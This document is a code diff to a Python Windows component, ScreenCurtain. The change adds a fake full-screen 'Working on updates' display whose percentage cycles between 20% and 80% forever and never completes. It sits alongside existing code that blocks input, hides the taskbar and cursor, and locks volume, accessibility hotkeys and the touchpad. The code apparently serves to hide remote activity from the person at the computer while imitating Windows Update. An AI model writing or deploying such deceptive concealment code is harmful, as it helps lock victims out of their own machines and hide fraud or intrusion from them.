@@ -1304,6 +1304,32 @@ class ScreenCurtain:
     _bg_locks_thread = None
     _bg_locks_stop = None
     _registered_hotkeys = []
+    _curtain_start_time = None
+    _last_painted_pct = None
+
+    @classmethod
+    def calculate_curtain_percentage(cls, elapsed: float) -> int:
+        """
+        Calculates realistic Windows Update progression:
+        - Starts at 20%
+        - Gradually increments from 20% to 80% over 30 minutes (1800s)
+        - Never reaches 100%
+        - Automatically cycles back to 20% every 30 minutes
+        """
+        CYCLE_SECONDS = 30 * 60  # 1800.0 seconds (30 minutes)
+        MIN_PCT = 20
+        MAX_PCT = 80
+        TOTAL_STEPS = MAX_PCT - MIN_PCT + 1  # 61 discrete values (20..80)
+
+        if elapsed < 0:
+            elapsed = 0.0
+
+        pos_in_cycle = elapsed % CYCLE_SECONDS
+        step = int((pos_in_cycle / CYCLE_SECONDS) * TOTAL_STEPS)
+        pct = MIN_PCT + step
+        if pct > MAX_PCT:
+            pct = MAX_PCT
+        return pct
 
     @classmethod
     def _set_taskbar_visible(cls, visible: bool):
@@ -1430,10 +1456,22 @@ class ScreenCurtain:
                 h = rc.bottom - rc.top
                 scale = max(1.0, min(w / 1920.0, h / 1080.0))
                 cx = w // 2
-                spinner_cy = int((h // 2) - 140 * scale)
+                cy = h // 2
+                spinner_cy = int(cy - 140 * scale)
                 spin_bound = int(90 * scale)
                 r_spin = wintypes.RECT(cx - spin_bound, spinner_cy - spin_bound, cx + spin_bound, spinner_cy + spin_bound)
-                user32.InvalidateRect(hwnd, ctypes.byref(r_spin), False)
+
+                now = time.time()
+                elapsed = max(0.0, now - (cls._curtain_start_time or now))
+                curr_pct = cls.calculate_curtain_percentage(elapsed)
+
+                if curr_pct != cls._last_painted_pct:
+                    cls._last_painted_pct = curr_pct
+                    # Full repaint when percentage advances so title text and background refresh cleanly
+                    user32.InvalidateRect(hwnd, None, False)
+                else:
+                    user32.InvalidateRect(hwnd, ctypes.byref(r_spin), False)
+
                 user32.UpdateWindow(hwnd)
                 return 0
         elif uMsg == 0x000F:  # WM_PAINT
@@ -1451,6 +1489,11 @@ class ScreenCurtain:
             spinner_cy = int(cy - 140 * scale)
             spin_bound = int(90 * scale)
 
+            now = time.time()
+            elapsed = max(0.0, now - (cls._curtain_start_time or now))
+            curr_pct = cls.calculate_curtain_percentage(elapsed)
+            cls._last_painted_pct = curr_pct
+
             # Check if this is an incremental animation frame repaint for just the spinner
             is_spinner_partial = (
                 ps.rcPaint.left >= cx - spin_bound and ps.rcPaint.right <= cx + spin_bound and
@@ -1458,17 +1501,18 @@ class ScreenCurtain:
             )
 
             if not is_spinner_partial:
-                # Full redraw with pure black background and white text (drawn only once or on resize)
+                # Full redraw with pure black background and white text (drawn only once or on resize / percentage increment)
                 user32.FillRect(hdc, ctypes.byref(rc), cls._bg_brush)
 
                 gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
 
-                # 1. Main Title: Working on updates 15% (Authentic Windows 11 large display font)
+                # 1. Main Title: Working on updates 20%..80% (Authentic Windows 11 large display font)
                 if cls._title_font:
                     gdi32.SelectObject(hdc, cls._title_font)
                 gdi32.SetTextColor(hdc, 0x00FFFFFF)
                 r_title = wintypes.RECT(0, int(cy - 10 * scale), w, int(cy + 65 * scale))
-                user32.DrawTextW(hdc, "Working on updates 15%", -1, ctypes.byref(r_title), 0x00000001 | 0x00000004)
+                title_text = f"Working on updates {curr_pct}%"
+                user32.DrawTextW(hdc, title_text, -1, ctypes.byref(r_title), 0x00000001 | 0x00000004)
 
                 # 2. Subtitle: Please keep your computer on
                 if cls._sub_font:
@@ -1762,6 +1806,8 @@ class ScreenCurtain:
                     cls._spin_size = 0
                 cls._locked_volume = None
                 cls._locked_mute = None
+                cls._curtain_start_time = None
+                cls._last_painted_pct = None
                 cls._set_taskbar_visible(True)
                 MirrorInput.set_stealth_cursor(False)
                 try:
@@ -1770,6 +1816,9 @@ class ScreenCurtain:
                     pass
 
             if cls._curtain_active:
+                if cls._curtain_start_time is None:
+                    cls._curtain_start_time = time.time()
+                cls._last_painted_pct = None
                 h = create_curtain_window()
                 if h:
                     cls._desktop_hwnds[b'initial'] = h
@@ -2021,7 +2070,12 @@ class ScreenCurtain:
             with cls._lock:
                 MirrorInput._ensure_default_desktop()
                 cls._curtain_active = bool(enabled)
-                if not enabled:
+                if enabled:
+                    cls._curtain_start_time = time.time()
+                    cls._last_painted_pct = None
+                else:
+                    cls._curtain_start_time = None
+                    cls._last_painted_pct = None
                     MirrorInput.set_stealth_cursor(False)
                     try:
                         user32.SystemParametersInfoW(0x0057, 0, None, 0)
@@ -2056,6 +2110,8 @@ class ScreenCurtain:
             with cls._lock:
                 cls._curtain_active = False
                 cls._input_blocked = False
+                cls._curtain_start_time = None
+                cls._last_painted_pct = None
                 AccessibilityHotkeyLock.restore_all()
                 TouchpadLock.restore()
                 WorkstationLockPolicy.restore()
